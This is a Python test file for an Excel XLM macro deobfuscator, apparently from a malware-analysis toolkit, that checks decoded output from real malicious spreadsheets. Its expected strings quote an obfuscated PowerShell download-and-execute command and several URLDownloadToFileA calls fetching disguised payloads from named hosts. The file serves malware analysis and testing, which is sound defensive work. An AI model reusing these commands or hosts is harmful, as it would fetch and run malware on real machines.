from test import download_sample
from test.lib.excel.samples import (
    XLM_MACRO_NAMES_BIFF8,
    XLM_MACRO_TEXT_XLSM,
)
from test.lib.scripts.xlm.modify import (
    date_cell,
    drop_defined_names,
    replace_cell_element,
    replace_cell_formula,
)

from ... import TestUnitBase


def _looping() -> bytes:
    data = download_sample(XLM_MACRO_TEXT_XLSM)
    for cell, formula in (
        ('AZ109', 'FOR.CELL("x",BJ116:BJ117)'),
        ('AZ110', 'SET.VALUE(BD108,x)'),
        ('AZ112', 'NEXT()'),
    ):
        data = replace_cell_formula(data, cell, formula)
    return data


class TestXLMMacroDeobfuscator(TestUnitBase):
    def test_maldoc(self):
        data = self.download_sample(
            'dc44bbfc845fc078cf38b9a3543a32ae1742be8c6320b81cf6cd5a8cee3c696a'
        )
        self.assertIn(r'C:\ProgramData\Ropedjo1.ocx', str(data | self.load()))

    def test_the_trace_lists_the_formula_of_every_executed_cell_in_order(self):
        self.assertEqual(
            str(self.download_sample(XLM_MACRO_NAMES_BIFF8) | self.load()),
            '=EXEC("powershell -Command IEX (new`-OB`jeCT(\'Net.WebClient\')).'
            '\'DoWnloAdsTrInG\'(\'ht\'+\'tp://paste.ee/r/pLpR9\')")',
        )

    def test_every_step_is_labelled_with_its_address_status_and_indent(self):
        self.assertEqual(
            [
                (chunk.meta['addr'], chunk.meta['type'], chunk.meta['indent'])
                for chunk in self.download_sample(XLM_MACRO_NAMES_BIFF8) | self.load()
            ],
            [('A9591', 'PartialEvaluation', 0)],
        )

    def test_the_filter_flag_hides_the_commands_that_move_execution(self):
        self.assertEqual(
            str(self.download_sample(XLM_MACRO_TEXT_XLSM) | self.load(filter=1)).splitlines()[0],
            'SET.VALUE(BD108,"URLMo")',
        )

    def test_the_second_filter_keeps_only_the_triage_commands(self):
        self.assertEqual(
            str(self.download_sample(XLM_MACRO_TEXT_XLSM) | self.load(filter=2)).splitlines(),
            [
                'CALL("URLMon","URLDownloadToFileA","JJCCBB",0,'
                '"https://maharaniworld.com/ds/3103.gif","..\\iekdhfe.dsk1",0,0)',
                'CALL("URLMon","URLDownloadToFileA","JJCCBB",0,'
                '"https://aycconsultoriaempresarial.com/ds/3103.gif","..\\iekdhfe.dsk2",0,0)',
                'CALL("URLMon","URLDownloadToFileA","JJCCBB",0,'
                '"https://sgb.ac.ke/ds/3103.gif","..\\iekdhfe.dsk3",0,0)',
                'CALL("URLMon","URLDownloadToFileA","JJCCBB",0,'
                '"https://hashmati.com/ds/3103.gif","..\\iekdhfe.dsk4",0,0)',
                'HALT()',
            ],
        )

    def test_the_body_of_a_loop_indents_its_steps(self):
        unit = self.load()
        self.assertEqual(
            [
                (chunk.meta['indent'], chunk.decode(unit.codec))
                for chunk in _looping() | unit
                if chunk.meta['indent']
            ],
            [
                (1, 'SET.VALUE(BD108,"ieclb.com.br/ds/3103.")'),
                (1, 'SET.VALUE(BD108,"maharaniworld.com/ds/3103.")'),
            ],
        )

    def test_the_trace_renders_braces_in_a_formula_literally(self):
        data = replace_cell_formula(
            self.download_sample(XLM_MACRO_TEXT_XLSM), 'AZ109', 'SET.VALUE(BD108,"{a}")'
        )
        self.assertEqual(
            str(data | self.load()).splitlines()[0],
            'SET.VALUE(BD108,"{a}")',
        )

    def test_the_trace_reaches_a_cell_only_a_computed_address_names(self):
        data = replace_cell_element(
            self.download_sample(XLM_MACRO_TEXT_XLSM), 'BH120', '<c r="BH120"><f>HALT()</f></c>'
        )
        data = replace_cell_formula(data, 'AZ109', 'GOTO(OFFSET(BG120,0,1))')
        self.assertEqual(
            str(data | self.load()).splitlines(),
            ['GOTO(OFFSET(BG120,0,1))', 'HALT()'],
        )

    def test_the_cell_flag_runs_where_no_name_points(self):
        nameless = drop_defined_names(self.download_sample(XLM_MACRO_TEXT_XLSM))
        self.assertEqual(
            str(nameless | self.load(cell='Doc1!AZ110')).splitlines()[0],
            'SET.VALUE(BD109,"URLDownloadToFile")',
        )

    def test_the_day_flag_answers_the_day_command_without_a_search(self):
        data = date_cell(self.download_sample(XLM_MACRO_TEXT_XLSM), 'AZ113', '2026-10-01T00:00:00')
        data = replace_cell_formula(data, 'AZ110', 'CHAR(DAY(AZ113)*8)')
        unit = self.load(day=17)
        steps = {chunk.meta['addr']: chunk for chunk in data | unit}
        self.assertEqual(steps['AZ110'].decode(unit.codec), '\x88')

    def test_the_day_of_the_default_run_comes_from_the_search_of_the_date(self):
        data = date_cell(self.download_sample(XLM_MACRO_TEXT_XLSM), 'AZ113', '2026-10-01T00:00:00')
        data = replace_cell_formula(data, 'AZ110', 'CHAR(DAY(AZ113)*8)')
        unit = self.load()
        steps = {chunk.meta['addr']: chunk for chunk in data | unit}
        self.assertEqual(steps['AZ110'].decode(unit.codec), ' ')
